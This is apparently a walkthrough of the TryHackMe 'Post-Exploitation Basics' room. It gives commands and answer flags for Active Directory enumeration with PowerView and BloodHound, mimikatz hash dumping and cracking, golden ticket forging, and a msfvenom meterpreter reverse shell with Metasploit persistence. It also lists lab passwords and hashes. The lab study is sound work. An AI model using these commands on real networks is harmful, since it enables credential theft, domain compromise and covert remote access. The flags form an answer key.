---
description: https://tryhackme.com/room/postexploit
---

# Post-Exploitation Basics

## Task 2 Enumeration w/ Powerview

```
powershell -ep bypass
. .\Downloads\PowerView.ps1
```

#### **What is the shared folder that is not set by default?**

```
Invoke-ShareFinder
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 17-45-20.png>)

{% hint style="success" %}
`Share`
{% endhint %}

#### **What operating system is running inside of the network besides Windows Server 2019?**

```
Get-NetComputer -FullData | select operatingsystem
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 17-44-54.png>)

{% hint style="success" %}
`Windows 10 Enterprise Evaluation`
{% endhint %}

#### **I've hidden a flag inside of the users find it**

```
Get-NetUser | select cn
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 17-43-49.png>)

{% hint style="success" %}
`POST{P0W3RV13W_FTW}`
{% endhint %}

## Task 3 Enumeration w/ Bloodhound

```bash
scp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe \
    Administrator@10.10.207.10:/C:/Users/Administrator/
```

```
SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot.zip
```

```bash
scp Administrator@10.10.207.10:/C:/Users/Administrator/20220314071651_loot.zip .
sudo neo4j console
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 21-54-12.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-14 21-54-24.png>)

```bash
bloodhound
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 21-55-08.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-14 22-19-55.png>)

#### **What service is also a domain admin**

![](<../../.gitbook/assets/Screenshot from 2022-03-14 22-21-27.png>)

{% hint style="success" %}
`SQLSERVICE`
{% endhint %}

#### **What two users are Kerberoastable?**

![](<../../.gitbook/assets/Screenshot from 2022-03-14 22-22-38.png>)

{% hint style="success" %}
`KRBTGT, SQLSERVICE`
{% endhint %}

## Task 4 Dumping hashes w/ mimikatz

```bash
cd Downloads
mimikatz.exe
mimikatz # privilege::debug 
mimikatz # lsadump::lsa /patch
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 22-30-06.png>)

#### what is the Machine1 Password?

```bash
echo '64f12cddaa88057e06a81b54e73b949b' > hash.txt
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 22-34-40.png>)

{% hint style="success" %}
`Password1`
{% endhint %}

#### What is the Machine2 Hash?

{% hint style="success" %}
`c39f2beb3d2ec06a62cb887fb391dee0`
{% endhint %}

## Task 5 Golden Ticket Attacks w/ mimikatz

```bash
xfreerdp /v:10.10.207.10 /u:administrator /p:'P@$$W0rd' /cert-ignore \
         +clipboard /dynamic-resolution /drive:share,/tmp
```

```bash
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local \
                 /sid:S-1-5-21-849420856-2351964222-986696166 \
                 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
kerberos::ptt ticket.kirbi
misc::cmd
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 22-53-55.png>)

## Task 6 Enumeration w/ Server Manager

#### What tool allows to view the event logs?

![](<../../.gitbook/assets/Screenshot from 2022-03-14 23-04-58.png>)

{% hint style="success" %}
Event Viewer
{% endhint %}

#### What is the SQL Service password

![](<../../.gitbook/assets/Screenshot from 2022-03-14 23-05-42.png>)

{% hint style="success" %}
`MYpassword123#`
{% endhint %}

## Task 7 Maintaining Access

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.9.176 \
         -a x86 --platform windows -f exe -o payload.exe
cp payload.exe /var/www/html
```

```bash
msfconsole
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 23-13-43.png>)

```bash
meterpreter > background
msf > use exploit/windows/local/persistense
msf > set SESSION 1
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-14 23-16-00.png>)

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux" %}
